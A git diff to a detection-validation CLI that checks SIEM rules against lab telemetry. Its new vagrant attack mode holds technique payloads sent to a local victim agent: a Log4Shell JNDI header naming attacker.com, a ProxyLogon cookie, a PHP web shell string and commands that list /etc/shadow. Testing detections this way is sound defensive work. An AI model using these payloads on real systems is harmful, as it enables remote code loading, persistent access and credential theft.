@@ -21,14 +21,165 @@ def main() -> None:
 
 @main.command()
 @click.argument("rules", required=False, default=".")
-@click.option("--siem", default="opensearch", show_default=True, help="Target SIEM backend.")
-@click.option("--output", default="stdout", show_default=True, help="Report output destination.")
+@click.option("--siem", default="opensearch", show_default=True,
+              help="SIEM backend(s): opensearch, splunk, or opensearch,splunk")
+@click.option("--since", default=24.0, show_default=True,
+              help="Only match telemetry from the last N hours (0 = all time).")
+@click.option("--index", default="dv-telemetry-*", show_default=True,
+              help="OpenSearch index pattern to query.")
+@click.option("--output", "-o", default="-", show_default=True,
+              help="Write updated JSONL (with validation_status) to this file (- = stdout).")
 @click.option("--format", "fmt", default="cli", show_default=True,
-              type=click.Choice(["cli", "json", "html", "sarif", "slack"]))
-def validate(rules: str, siem: str, output: str, fmt: str) -> None:
-    """Validate detection rules against live or synthetic attack telemetry."""
-    console.print(f"[cyan]Validating rules in:[/] {rules}  siem={siem}  format={fmt}")
-    console.print("[yellow]TODO: implement validation pipeline[/]")
+              type=click.Choice(["cli", "json"]))
+def validate(rules: str, siem: str, since: float, index: str, output: str, fmt: str) -> None:
+    """Validate detection rules against live SIEM telemetry.
+
+    Loads every rule under RULES (file or directory), translates each one to a
+    live query against OpenSearch / Splunk, and reports whether the rule fired.
+
+    \b
+    Workflow:
+      dv attack --cve CVE-2021-44228 --target vagrant --agent-port 9098
+      dv validate examples/detections/sigma/ --since 1
+      dv validate examples/detections/sigma/ --siem opensearch,splunk
+
+    \b
+    A rule PASSES if the SIEM returns ≥1 hit matching either:
+      • the technique IDs declared in the rule's ATT&CK tags, OR
+      • keywords from the rule's detection section found in proctitle / cmd_output.
+    """
+    import time as _time
+
+    from detection_validator.parsers.registry import ParserRegistry
+    from detection_validator.parsers.base import ParseError
+    from detection_validator.validator.engine import validate_corpus, RuleResult
+    from rich.table import Table
+    from rich.progress import Progress, SpinnerColumn, TextColumn
+    from pathlib import Path as _Path
+
+    registry = ParserRegistry()
+    root = _Path(rules)
+
+    # ── Load rules ────────────────────────────────────────────────────────────
+    files = [root] if root.is_file() else sorted(f for f in root.rglob("*") if f.is_file())
+    detections = []
+    for fp in files:
+        try:
+            parser = registry.find_parser(fp)
+            if parser is None:
+                continue
+            detections.append(parser.parse_file(fp))
+        except (ParseError, Exception):
+            continue
+
+    if not detections:
+        err_console.print(f"[red]No parseable rules found in:[/] {rules}")
+        raise SystemExit(1)
+
+    err_console.print(f"[cyan]Loaded {len(detections)} rule(s)[/]  siem={siem}  since={since}h  index={index}\n")
+
+    # ── Run validation ────────────────────────────────────────────────────────
+    t0 = _time.time()
+    with Progress(SpinnerColumn(), TextColumn("{task.description}"),
+                  transient=True, console=err_console) as prog:
+        prog.add_task(f"Querying {siem}…", total=None)
+        results: list[RuleResult] = validate_corpus(
+            detections, siem=siem, since_hours=since, os_index=index,
+        )
+    elapsed = _time.time() - t0
+
+    # ── Format output ─────────────────────────────────────────────────────────
+    if fmt == "json":
+        out = open(output, "w", encoding="utf-8") if output != "-" else sys.stdout
+        try:
+            payload = [
+                {
+                    "rule_id": r.rule_id, "name": r.name,
+                    "techniques": r.techniques, "siem": r.siem,
+                    "query": r.query_desc, "hits": r.hit_count,
+                    "status": r.status, "error": r.error,
+                    "samples": r.sample_events[:1],
+                }
+                for r in results
+            ]
+            print(json.dumps(payload, indent=2, default=str), file=out)
+        finally:
+            if output != "-":
+                out.close()
+        return
+
+    # CLI table
+    tbl = Table(show_header=True, header_style="bold", box=None, padding=(0, 1))
+    tbl.add_column("Rule", style="white", max_width=38)
+    tbl.add_column("Techniques", style="cyan", max_width=22)
+    tbl.add_column("Hits", justify="right", width=5)
+    tbl.add_column("SIEM", width=11)
+    tbl.add_column("Status", width=8)
+
+    passed = failed = errors = skipped = 0
+    covered_techniques: set[str] = set()
+
+    for r in results:
+        icon, style = {
+            "pass":  ("✓", "green"),
+            "fail":  ("✗", "red"),
+            "error": ("!", "yellow"),
+            "skip":  ("–", "dim"),
+        }.get(r.status, ("?", "white"))
+
+        if r.status == "pass":
+            passed += 1
+            covered_techniques.update(r.techniques)
+        elif r.status == "fail":
+            failed += 1
+        elif r.status == "error":
+            errors += 1
+        else:
+            skipped += 1
+
+        tech_str = ", ".join(r.techniques[:3]) + ("…" if len(r.techniques) > 3 else "")
+        hit_str = str(r.hit_count) if r.status not in ("error", "skip") else "-"
+        status_str = f"[{style}]{icon} {r.status.upper()}[/]"
+
+        tbl.add_row(r.name[:38], tech_str, hit_str, r.siem, status_str)
+
+        # Show sample event snippet for passing rules
+        if r.status == "pass" and r.sample_events:
+            ev = r.sample_events[0]
+            snippet = (
+                ev.get("proctitle") or ev.get("cmd_output") or
+                ev.get("technique") or ev.get("key") or ""
+            )
+            if snippet:
+                tbl.add_row(
+                    f"  [dim]{str(snippet)[:60]}[/]", "", "", "", "",
+                )
+
+        # Show error detail
+        if r.status == "error" and r.error:
+            tbl.add_row(f"  [yellow]{r.error[:70]}[/]", "", "", "", "")
+
+    console.print(tbl)
+    console.print()
+
+    total = len(results)
+    console.print(
+        f"[bold]Results:[/] {total} rule(s)  "
+        f"[green]{passed} PASS[/]  [red]{failed} FAIL[/]  "
+        f"[yellow]{errors} ERROR[/]  [dim]{skipped} SKIP[/]  "
+        f"({elapsed:.1f}s)"
+    )
+    if covered_techniques:
+        console.print(
+            f"[bold]Covered techniques:[/] [green]{', '.join(sorted(covered_techniques))}[/]"
+        )
+
+    # ── Write updated detections (with validation_status) ─────────────────────
+    if output != "-":
+        with open(output, "w", encoding="utf-8") as fh:
+            for det in detections:
+                print(det.model_dump_json(), file=fh)
+        err_console.print(f"\n[green]✓[/] Updated detections written to [bold]{output}[/]")
 
 
 @main.command()
@@ -532,6 +683,121 @@ def navigator(detections: str, output: str, name: str, description: str) -> None
     )
 
 
+def _run_attack_direct(scenario_path: Path, agent_port: str, delay: float) -> None:
+    """Run an attack scenario by calling the victim agent directly (vagrant mode)."""
+    import time as _time
+    import urllib.request
+
+    try:
+        import yaml
+    except ImportError:
+        err_console.print("[red]pyyaml not installed. Run: pip install pyyaml[/]")
+        raise SystemExit(1)
+
+    # Map techniques to concrete step payloads (mirrors docker/atomic-runner/techniques.py)
+    _TECHNIQUE_STEPS: dict[str, list[dict]] = {
+        "T1190": [
+            {"technique": "T1190", "variant": "log4shell", "event_type": "SYSCALL",
+             "key": "network_connect", "exe": "/usr/bin/curl", "uid": "33",
+             "command": "curl -sk http://127.0.0.1:8080/ -H 'X-Api-Version: ${jndi:ldap://attacker.com/exploit}' 2>&1 | head -5",
+             "extra": {"http_method": "GET", "cve": "CVE-2021-44228"}},
+            {"technique": "T1190", "variant": "proxylogon", "event_type": "SYSCALL",
+             "key": "network_connect", "exe": "/usr/bin/curl", "uid": "33",
+             "command": "curl -sk http://127.0.0.1:443/ews/exchange.asmx -H 'Cookie: X-BEResource=a]@SERVER:444/EWS/Exchange.asmx?~3;' 2>&1 | head -5",
+             "extra": {"http_method": "POST", "cve": "CVE-2021-26855"}},
+        ],
+        "T1059.004": [
+            {"technique": "T1059.004", "event_type": "SYSCALL", "key": "shell_exec",
+             "exe": "/bin/bash", "uid": "33",
+             "command": "id && whoami && uname -a",
+             "extra": {"interpreter": "bash"}},
+        ],
+        "T1068": [
+            {"technique": "T1068", "event_type": "SYSCALL", "key": "priv_change",
+             "exe": "/tmp/exploit", "uid": "1001",
+             "command": "ls -la /etc/shadow 2>&1 | head -3",
+             "extra": {"description": "privilege escalation attempt"}},
+        ],
+        "T1547.012": [
+            {"technique": "T1547.012", "event_type": "PATH", "key": "file_write",
+             "exe": "/bin/cp", "uid": "0",
+             "command": "ls /usr/lib/cups/backend/ 2>/dev/null | head -5",
+             "extra": {"path": "/usr/lib/cups/backend/malicious"}},
+        ],
+        "T1574.001": [
+            {"technique": "T1574.001", "event_type": "PATH", "key": "file_write",
+             "exe": "/bin/bash", "uid": "1001",
+             "command": "echo 'hijack library drop' && ls /tmp/ | head -5",
+             "extra": {"path": "/tmp/libmalicious.so"}},
+        ],
+        "T1505.003": [
+            {"technique": "T1505.003", "event_type": "PATH", "key": "file_write",
+             "exe": "/usr/bin/php", "uid": "33",
+             "command": "ls /var/www/ 2>/dev/null | head -5",
+             "extra": {"path": "/var/www/html/shell.php", "content": "<?php system($_GET['cmd']); ?>"}},
+        ],
+        "T1078": [
+            {"technique": "T1078", "event_type": "SYSCALL", "key": "identity_check",
+             "exe": "/usr/bin/id", "uid": "33",
+             "command": "id && groups",
+             "extra": {}},
+        ],
+        "T1552.001": [
+            {"technique": "T1552.001", "event_type": "PATH", "key": "sensitive_file",
+             "exe": "/bin/cat", "uid": "0",
+             "command": "ls -la /etc/passwd /etc/shadow 2>&1",
+             "extra": {"files": ["/etc/passwd", "/etc/shadow"]}},
+        ],
+    }
+
+    if not scenario_path.exists():
+        err_console.print(f"[red]Scenario file not found: {scenario_path}[/]")
+        raise SystemExit(1)
+
+    with open(scenario_path) as fh:
+        scenario = yaml.safe_load(fh)
+
+    steps_config = scenario.get("steps", [])
+    console.print(f"[cyan]Scenario:[/] {scenario.get('name', scenario_path.name)}")
+    if scenario.get("cve"):
+        console.print(f"  CVE: [bold]{scenario['cve']}[/]  CVSS: {scenario.get('cvss', '?')}")
+    console.print()
+
+    simulate_url = f"http://localhost:{agent_port}/simulate"
+    total = 0
+    for step_cfg in steps_config:
+        tech_id = step_cfg.get("technique", "")
+        variant = step_cfg.get("variant")
+        steps = _TECHNIQUE_STEPS.get(tech_id, [])
+        if variant:
+            steps = [s for s in steps if s.get("variant") == variant] or steps[:1]
+        if not steps:
+            err_console.print(f"[yellow]  ⚠ No steps for technique {tech_id}[/]")
+            continue
+        for step in steps:
+            payload = json.dumps(step).encode()
+            req = urllib.request.Request(
+                simulate_url,
+                data=payload,
+                headers={"Content-Type": "application/json"},
+            )
+            try:
+                with urllib.request.urlopen(req, timeout=15) as resp:
+                    result = json.loads(resp.read())
+                rc = result.get("returncode", "?")
+                out = (result.get("output") or "")[:80].replace("\n", " ")
+                icon = "[green]✓[/]" if rc == 0 else "[red]✗[/]"
+                console.print(f"  {icon} [bold]{tech_id}[/]  key={step.get('key','?')}  rc={rc}")
+                if out:
+                    console.print(f"    [dim]{out}[/]")
+                total += 1
+            except Exception as exc:
+                err_console.print(f"  [red]✗ {tech_id}: {exc}[/]")
+            _time.sleep(delay)
+
+    console.print(f"\n[bold green]✓ {total} steps executed.[/]")
+
+
 @main.command()
 @click.option("--cve", "cve_id", default=None,
               help="CVE ID to simulate (e.g. CVE-2021-44228). Looks up the matching scenario.")
@@ -542,6 +808,10 @@ def navigator(detections: str, output: str, name: str, description: str) -> None
               help="Victim container name or hostname.")
 @click.option("--agent-port", default="9099", show_default=True,
               help="Victim agent HTTP port.")
+@click.option("--target", default="docker",
+              type=click.Choice(["docker", "vagrant"]),
+              show_default=True,
+              help="Attack target: docker (run atomic-runner container) or vagrant (call agent directly).")
 @click.option("--watch", is_flag=True, default=False,
               help="After the run, show the attack events that landed in OpenSearch.")
 @click.option("--delay", default=1.5, show_default=True,
@@ -551,25 +821,20 @@ def attack(
     scenario_file: str | None,
     victim: str,
     agent_port: str,
+    target: str,
     watch: bool,
     delay: float,
 ) -> None:
     """Simulate a CVE-based attack against the Linux victim container.
 
-    Runs the atomic-runner against dv-linux-victim, which executes the
-    technique simulations and emits structured events that flow through
-    Vector into OpenSearch and Splunk.
-
-    \b
-    Prerequisites:
-      docker build --platform linux/arm64 -t detection-validator/linux-victim:dev docker/linux-victim/
-      docker build --platform linux/arm64 -t detection-validator/atomic-runner:dev docker/atomic-runner/
-      docker run -d --name dv-linux-victim --network detectval-lab ...
+    Use --target docker (default) to run via the atomic-runner container,
+    or --target vagrant to call the Vagrant VM agent directly from Python.
 
     \b
     Examples:
       dv attack --cve CVE-2021-44228
       dv attack --cve CVE-2021-34527 --watch
+      dv attack --cve CVE-2021-44228 --target vagrant
       dv attack --scenario docker/atomic-runner/scenarios/proxylogon-cve-2021-26855.yml
     """
     import subprocess
@@ -589,8 +854,10 @@ def attack(
             err_console.print(f"Available: {', '.join(_CVE_TO_SCENARIO)}")
             raise SystemExit(1)
         scenario_in_container = f"/scenarios/{fname}"
+        local_scenario = Path(__file__).parents[2] / "docker" / "atomic-runner" / "scenarios" / fname
     elif scenario_file:
         scenario_in_container = scenario_file
+        local_scenario = Path(scenario_file)
     else:
         err_console.print("[red]Provide --cve or --scenario.[/]")
         raise SystemExit(1)
@@ -603,28 +870,36 @@ def attack(
         urllib.request.urlopen(agent_url, timeout=3)
     except Exception:
         err_console.print(f"[red]✗ Victim agent not reachable at {agent_url}[/]")
-        err_console.print("  Start it with:  docker run -d --name dv-linux-victim \\")
-        err_console.print("    --network detectval-lab -p 9099:9099 \\")
-        err_console.print("    detection-validator/linux-victim:dev")
+        if target == "vagrant":
+            err_console.print("  Start the Vagrant VM:  cd vagrant && vagrant up")
+        else:
+            err_console.print("  Start it with:  docker run -d --name dv-linux-victim \\")
+            err_console.print("    --network detectval-lab -p 9099:9099 \\")
+            err_console.print("    detection-validator/linux-victim:dev")
         raise SystemExit(1)
 
-    # ── run the atomic-runner container ─────────────────────────────────────
-    console.print(f"\n[bold cyan]⚔  Running attack scenario[/]  cve={cve_id or scenario_file}")
+    console.print(f"\n[bold cyan]⚔  Running attack scenario[/]  cve={cve_id or scenario_file}  target={target}")
     console.print(f"   Victim: [yellow]{victim}[/]  agent: {agent_url}\n")
 
-    cmd = [
-        "docker", "run", "--rm",
-        "--network", "detectval-lab",
-        "-e", f"RUNNER_TARGET_HOST={victim}",
-        "-e", f"RUNNER_AGENT_PORT={agent_port}",
-        "-e", f"RUNNER_STEP_DELAY={delay}",
-        "detection-validator/atomic-runner:dev",
-        "run", "--scenario", scenario_in_container,
-    ]
-    result = subprocess.run(cmd)
-    if result.returncode != 0:
-        err_console.print(f"[red]Runner exited with code {result.returncode}[/]")
-        raise SystemExit(result.returncode)
+    # ── vagrant mode: call agent directly from Python ────────────────────────
+    if target == "vagrant":
+        _run_attack_direct(local_scenario, agent_port, delay)
+        # skip the Docker runner section below
+    else:
+        # ── docker mode: run the atomic-runner container ─────────────────────
+        cmd = [
+            "docker", "run", "--rm",
+            "--network", "detectval-lab",
+            "-e", f"RUNNER_TARGET_HOST={victim}",
+            "-e", f"RUNNER_AGENT_PORT={agent_port}",
+            "-e", f"RUNNER_STEP_DELAY={delay}",
+            "detection-validator/atomic-runner:dev",
+            "run", "--scenario", scenario_in_container,
+        ]
+        result = subprocess.run(cmd)
+        if result.returncode != 0:
+            err_console.print(f"[red]Runner exited with code {result.returncode}[/]")
+            raise SystemExit(result.returncode)
 
     # ── optionally show events from OpenSearch ───────────────────────────────
     if watch:
